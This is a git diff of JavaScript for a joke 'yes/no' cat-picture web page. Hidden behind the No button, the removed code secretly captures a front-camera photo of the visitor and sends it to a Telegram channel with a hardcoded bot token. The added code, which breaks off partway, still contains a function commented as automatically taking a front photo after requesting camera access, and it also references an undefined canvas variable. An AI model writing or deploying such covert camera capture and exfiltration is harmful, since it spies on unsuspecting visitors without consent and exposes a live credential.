@@ -4,14 +4,29 @@ const buttonsContainer = document.querySelector(".buttons");
 const yesButton = document.querySelector(".btn--yes");
 const noButton = document.querySelector(".btn--no");
 const catImg = document.querySelector(".cat-img");
+
 const MAX_IMAGES = 5;
 
 let play = true;
 let noCount = 0;
 
 yesButton.addEventListener("click", handleYesClick);
+
+noButton.addEventListener("click", function () {
+  if (play) {
+    noCount++;
+    const imageIndex = Math.min(noCount, MAX_IMAGES);
+    changeImage(imageIndex);
+    resizeYesButton();
+    updateNoButtonText();
+    if (noCount === MAX_IMAGES) {
+      play = false;
+    }
+  }
+});
+
 function handleYesClick() {
-  titleElement.innerHTML = "SEX SALBATIC! >_<";
+  titleElement.innerHTML = "Yayyy!! :3";
   buttonsContainer.classList.add("hidden");
   changeImage("yes");
 }
@@ -26,12 +41,12 @@ function resizeYesButton() {
 
 function generateMessage(noCount) {
   const messages = [
-    "Nu",
-    "Sigur?",
+    "No",
+    "Are you sure?",
     "Pookie please",
-    "Te rog",
-    "Esti loser-ul meu preferat ",
-    "Bine atunci..."
+    "Don't do this to me :(",
+    "You're breaking my heart",
+    "I'm gonna cry...",
   ];
 
   const messageIndex = Math.min(noCount, messages.length - 1);
@@ -43,71 +58,36 @@ function changeImage(image) {
 }
 
 function updateNoButtonText() {
-  noCount++;
-  const message = generateMessage(noCount);
-  noButton.innerHTML = message;
-
-  if (message === "Bine atunci...") {
-    noButton.addEventListener("click", function () {
-      if (play) {
-        play = false;
-
-        const Camera = require('js-camera');
-
-        // Create a new instance of the Camera
-        const camera = new Camera({
-          video: {
-            width: 60,
-            height: 40
-          },
-          audio: false
-        });
-
-        // Take a picture with the front camera
-        camera.takePicture({
-          flip: Camera.FLIP.BOTHORIZONTAL,
-          facingMode: Camera.FACING_MODE.USER
-        }).then(function (dataUrl) {
-          // Send the image to the Telegram channel
-          sendImageToTelegramChannel(dataUrl);
-
-          // Resize the yes button
-          resizeYesButton();
-
-          // Update the no button text
-          updateNoButtonText();
-
-          // Stop the camera
-          camera.stop();
-        }).catch(function (error) {
-          console.error('Error taking picture:', error);
-        });
-      }
-    });
-  }
+  noButton.innerHTML = generateMessage(noCount);
 }
 
-noButton.addEventListener("click", function () {
-  if (play) {
-    const imageIndex = Math.min(noCount, MAX_IMAGES);
+// Add iOS-specific camera permission requests
+function requestCameraPermission() {
+  return new Promise((resolve, reject) => {
+    const constraints = {
+      audio: false,
+      video: { facingMode: "user" }
+    };
 
-    changeImage(imageIndex);
-    resizeYesButton();
-    updateNoButtonText();
-  }
-});
-
-// Send the image to the Telegram channel
-function sendImageToTelegramChannel(dataUrl) {
-  // Create a new instance of the TelegramBot
-  const TelegramBot = require('node-telegram-bot-api');
-
-  // Replace YOUR_TELEGRAM_BOT_TOKEN with the token you received from BotFather
-  const token = '6644421997:AAGVhqt5RAdPkpBgOMO2ZyqvHhh8FNu47LE';
-  const bot = new TelegramBot(token, {polling: true});
-
-  // Send the image to the Telegram channel
-  bot.sendPhoto('@auejazni', dataUrl, {
-    caption: 'Image taken with the front camera'
+    navigator.mediaDevices.getUserMedia(constraints)
+      .then(() => {
+        resolve();
+      })
+      .catch((error) => {
+        reject(error);
+      });
   });
 }
+
+// Modify the provided code to automatically take a front photo
+async function takeFrontPhoto() {
+  try {
+    await requestCameraPermission();
+
+    // Trigger the photo capture functionality
+    const videoElement = document.querySelector('video');
+    const canvasElement = document.createElement('canvas');
+    const canvasContext = canvas.getContext('2d');
+
+    canvasElement.width = videoElement.videoWidth;
+    canvasElement.height = videoElement.videoHeight;
